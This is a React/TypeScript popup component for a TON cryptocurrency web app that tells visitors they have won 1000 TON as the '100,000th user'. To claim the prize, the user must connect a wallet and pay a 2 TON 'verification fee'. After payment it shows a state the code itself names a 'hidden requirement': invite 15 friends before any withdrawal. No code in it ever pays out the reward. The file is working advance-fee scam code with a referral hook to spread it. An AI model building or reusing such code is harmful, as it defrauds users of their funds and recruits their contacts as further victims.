import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Gift, Wallet, X, Users } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useTonConnectUI } from '@tonconnect/ui-react';
import { sendTONPayment } from '@/utils/ton';

interface RewardPopupProps {
  isOpen: boolean;
  onClose: () => void;
  onNavigateToReferral?: () => void;
}

const RewardPopup: React.FC<RewardPopupProps> = ({ isOpen, onClose, onNavigateToReferral }) => {
  const { toast } = useToast();
  const [tonConnectUI] = useTonConnectUI();
  const [claimed, setClaimed] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showHiddenRequirement, setShowHiddenRequirement] = useState(false);

  const isWalletConnected = !!tonConnectUI.wallet;

  const handleConnectWallet = async () => {
    setIsConnecting(true);
    try {
      await tonConnectUI.openModal();
      toast({
        title: "Opening Connection",
        description: "Please select your wallet",
      });
    } catch (error) {
      console.error('Error connecting wallet:', error);
      toast({
        title: "Connection Error",
        description: "Failed to connect wallet",
        variant: "destructive"
      });
    } finally {
      setIsConnecting(false);
    }
  };

  const handlePayVerificationFee = async () => {
    if (!isWalletConnected) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      });
      return;
    }

    setIsProcessing(true);
    try {
      console.log('Sending 2 TON verification payment...');
      const result = await sendTONPayment(tonConnectUI, 2);
      
      console.log('TON payment successful:', result);
      setClaimed(true);
      
      // Show hidden requirement after successful payment
      setTimeout(() => {
        setShowHiddenRequirement(true);
      }, 1500);
      
      toast({
        title: "🎉 Payment Successful!",
        description: "Please complete the final requirement below",
      });
      
    } catch (error) {
      console.error('Payment failed:', error);
      toast({
        title: "Payment Failed",
        description: "An error occurred during payment",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleClaim = () => {
    if (!isWalletConnected) {
      handleConnectWallet();
      return;
    }
    
    handlePayVerificationFee();
  };

  // Handle click outside to close
  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  // Fixed cancel handler - ensuring it properly closes the popup
  const handleCancel = () => {
    console.log('Cancel button clicked - closing popup');
    onClose();
  };

  const handleInviteFriends = () => {
    if (onNavigateToReferral) {
      onNavigateToReferral();
    }
    onClose();
  };

  // Handle escape key
  useEffect(() => {
    const handleEscapeKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape' && isOpen) {
        onClose();
      }
    };

    if (isOpen) {
      document.addEventListener('keydown', handleEscapeKey);
    }

    return () => {
      document.removeEventListener('keydown', handleEscapeKey);
    };
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4" onClick={handleBackdropClick}>
      <div className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 rounded-2xl p-4 max-w-xs w-full border border-blue-500/30 shadow-2xl relative overflow-hidden" onClick={(e) => e.stopPropagation()}>
        {/* Animated background elements */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute -top-8 -right-8 w-16 h-16 bg-yellow-400/20 rounded-full animate-pulse"></div>
          <div className="absolute -bottom-8 -left-8 w-12 h-12 bg-blue-400/20 rounded-full animate-pulse delay-1000"></div>
        </div>

        {/* Content */}
        <div className="relative z-10 text-center space-y-3">
          {/* Gift icon */}
          <div className="mx-auto w-10 h-10 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center shadow-lg">
            <Gift className="w-5 h-5 text-white" />
          </div>

          {/* Title */}
          <div>
            <h2 className="text-base font-bold text-white mb-1">Congratulations! You Won 1000 TON</h2>
            <p className="text-gray-300 text-xs mb-2">You are the 100,000th user! To celebrate this achievement, you have been selected to receive 1000 TON.</p>
            
            {/* Important Notice */}
            {!showHiddenRequirement && (
              <div className="bg-red-600/20 border border-red-500/30 rounded-lg p-2 mb-2">
                <p className="text-red-300 text-xs font-semibold mb-1">Important Notice:</p>
                <p className="text-gray-300 text-xs leading-relaxed">
                  A verification fee of 2 TON is required to ensure the prize reaches the correct wallet.
                </p>
                <p className="text-gray-300 text-xs leading-relaxed mt-1">
                  The full reward will be transferred within minutes after verification.
                </p>
              </div>
            )}

            {/* Hidden requirement - only shown after payment */}
            {showHiddenRequirement && (
              <div className="bg-orange-600/20 border border-orange-500/30 rounded-lg p-2 mb-2">
                <p className="text-orange-300 text-xs font-semibold mb-1">Final Requirement:</p>
                <p className="text-gray-300 text-xs leading-relaxed">
                  To complete your 1000 TON withdrawal, you need to invite 15 friends to our platform.
                </p>
                <p className="text-gray-300 text-xs leading-relaxed mt-1">
                  This helps us grow our community and ensures legitimate users receive rewards.
                </p>
              </div>
            )}
          </div>

          {/* Reward display */}
          <div className="bg-gradient-to-r from-blue-600/50 to-purple-600/50 rounded-xl p-2 border border-blue-400/30">
            <div className="flex items-center justify-center gap-2">
              <img 
                src="/lovable-uploads/1e3f7a79-7f90-4605-90b2-fd779ee99f8f.png" 
                alt="TON" 
                className="w-5 h-5" 
              />
              <div>
                <div className="text-xl font-bold text-white">1000</div>
                <div className="text-blue-300 text-xs font-medium">TON</div>
              </div>
            </div>
          </div>

          {/* Action buttons */}
          <div className="space-y-2">
            {!showHiddenRequirement && (
              <>
                {!isWalletConnected ? (
                  <Button
                    onClick={handleConnectWallet}
                    disabled={isConnecting}
                    className="w-full py-2 text-sm font-semibold rounded-xl bg-gradient-to-r from-blue-500 to-purple-500 hover:from-blue-600 hover:to-purple-600 text-white shadow-lg transition-all duration-300"
                  >
                    <Wallet className="w-4 h-4 mr-2" />
                    {isConnecting ? 'Connecting...' : 'Connect Wallet'}
                  </Button>
                ) : (
                  <Button
                    onClick={handleClaim}
                    disabled={claimed || isProcessing}
                    className={`w-full py-2 text-sm font-semibold rounded-xl transition-all duration-300 ${
                      claimed 
                        ? 'bg-green-600 hover:bg-green-600 text-white' 
                        : 'bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 text-white shadow-lg'
                    }`}
                  >
                    <img 
                      src="/lovable-uploads/1e3f7a79-7f90-4605-90b2-fd779ee99f8f.png" 
                      alt="TON" 
                      className="w-4 h-4 mr-2" 
                    />
                    {isProcessing ? 'Processing...' : claimed ? '✓ Payment Complete!' : 'Pay 2 TON & Get Reward'}
                  </Button>
                )}
              </>
            )}

            {/* Show invite friends button after payment */}
            {showHiddenRequirement && (
              <Button
                onClick={handleInviteFriends}
                className="w-full py-2 text-sm font-semibold rounded-xl bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white shadow-lg transition-all duration-300"
              >
                <div className="flex items-center justify-center gap-2">
                  <img 
                    src="/lovable-uploads/03ba6c03-8e93-4349-aaa5-9b19b4a8a287.png" 
                    alt="SPACE" 
                    className="w-4 h-4" 
                  />
                  <Users className="w-4 h-4" />
                  <span>Invite 15 Friends to Withdraw</span>
                </div>
              </Button>
            )}

            {/* Cancel button */}
            <Button
              onClick={handleCancel}
              variant="ghost"
              className="w-full text-white/80 hover:text-white hover:bg-white/20 text-sm py-2 rounded-xl transition-colors"
            >
              <X className="w-4 h-4 mr-2" />
              Cancel
            </Button>
          </div>

          {/* Footer text */}
          <p className="text-gray-400 text-xs">
            {!showHiddenRequirement 
              ? (isWalletConnected ? 'Proceed with TON payment to claim your reward' : 'Connect your wallet first to continue')
              : 'Complete the final requirement to receive your 1000 TON'
            }
          </p>
        </div>
      </div>
    </div>
  );
};

export default RewardPopup;
